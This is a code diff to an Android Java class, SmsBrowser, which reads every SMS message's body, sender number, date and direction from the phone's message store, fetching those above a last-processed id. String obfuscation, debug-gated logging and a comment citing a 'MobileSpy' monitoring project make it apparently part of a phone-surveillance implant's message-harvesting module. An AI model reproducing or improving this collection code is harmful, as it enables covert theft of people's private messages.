@@ -22,6 +22,8 @@ import com.android.m.M;
 public class SmsBrowser {
 	private static final String TAG = "SmsBrowser"; //$NON-NLS-1$
 
+	private static final int MESSAGE_TYPE_SENT = 2;
+
 	private final ArrayList<Sms> list;
 
 	private int id;
@@ -34,30 +36,22 @@ public class SmsBrowser {
 	public synchronized ArrayList<Sms> getSmsList(int lastManagedId) {
 		list.clear();
 
-		int maxRec = parse(M.e("content://sms/inbox"), Sms.RECEIVED, lastManagedId); //$NON-NLS-1$
-		int maxSent = parse(M.e("content://sms/sent"), Sms.SENT, lastManagedId); //$NON-NLS-1$
+		// cambiamento!
+		// https://gbandroid.googlecode.com/svn-history/r46/trunk/MobileSpy/src/org/ddth/android/monitor/observer/AndroidSmsWatcher.java
 
-		maxId = Math.max(maxRec, maxSent);
-
-		return list;
-	}
-
-	public synchronized ArrayList<Sms> getLastSmsSent(int lastManagedId) {
-		list.clear();
-
-		maxId = parse(M.e("content://sms/sent"), Sms.SENT, lastManagedId); //$NON-NLS-1$
+		maxId = parse(M.e("content://sms"), lastManagedId); //$NON-NLS-1$
 
 		return list;
 	}
 
-	private int parse(String content, boolean sentState, int lastManagedId) {
+	private int parse(String content, int lastManagedId) {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (parse), lastManagedId: " + lastManagedId);
 		}
 
 		final String[] projection = new String[] { "*" };
 		final Cursor c = Status.getAppContext().getContentResolver()
-				.query(Uri.parse(content), projection, null, null, null);
+				.query(Uri.parse(content), projection, "_id>" + lastManagedId, null, "_id");
 
 		final int smsEntriesCount = c.getCount();
 		int localMaxId = lastManagedId;
@@ -75,9 +69,11 @@ public class SmsBrowser {
 			// These fields are needed
 			try {
 				id = Integer.parseInt(c.getString(c.getColumnIndexOrThrow("_id")).toString());
+				// msg_id =
+				// Integer.parseInt(c.getString(c.getColumnIndexOrThrow("msg_id")).toString());
 
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (parse): id = " + id + " new maxId: " + maxId);
+					Check.log(TAG + " (parse): id = " + id + " new maxId: " + localMaxId);
 				}
 				if (id <= lastManagedId) {
 					continue;
@@ -88,9 +84,10 @@ public class SmsBrowser {
 
 				body = c.getString(c.getColumnIndexOrThrow(M.e("body"))).toString(); //$NON-NLS-1$
 				number = c.getString(c.getColumnIndexOrThrow(M.e("address"))).toString(); //$NON-NLS-1$
-				date = Long.parseLong(c.getString(c.getColumnIndexOrThrow(M.e("date"))).toString()); //$NON-NLS-1$
+				date = c.getLong(c.getColumnIndexOrThrow(M.e("date"))); //$NON-NLS-1$
+				int type = c.getInt(c.getColumnIndexOrThrow("type"));
 
-				sentStatus = sentState;
+				sentStatus = type == MESSAGE_TYPE_SENT;
 			} catch (final Exception e) {
 				if (Cfg.EXCEPTION) {
 					Check.log(e);
@@ -100,12 +97,11 @@ public class SmsBrowser {
 					Check.log(e);//$NON-NLS-1$
 				}
 
-				c.close();
-				return localMaxId;
+				c.moveToNext();
+				continue;
 			}
 
-			final Sms s = new Sms(number, body, date, sentStatus);
-			s.setId(id);
+			final Sms s = new Sms(id, number, body, date, sentStatus);
 
 			// These fields are optional
 			try {
@@ -219,7 +215,7 @@ public class SmsBrowser {
 
 			if (Cfg.DEBUG) {
 
-				if (name.equals("body") || name.equals("body")) {
+				if (name.equals("body") || name.equals("type")) {
 					Check.log(TAG + " (parse): " + name + " = " + value);//$NON-NLS-1$ //$NON-NLS-2$
 				}
 			}
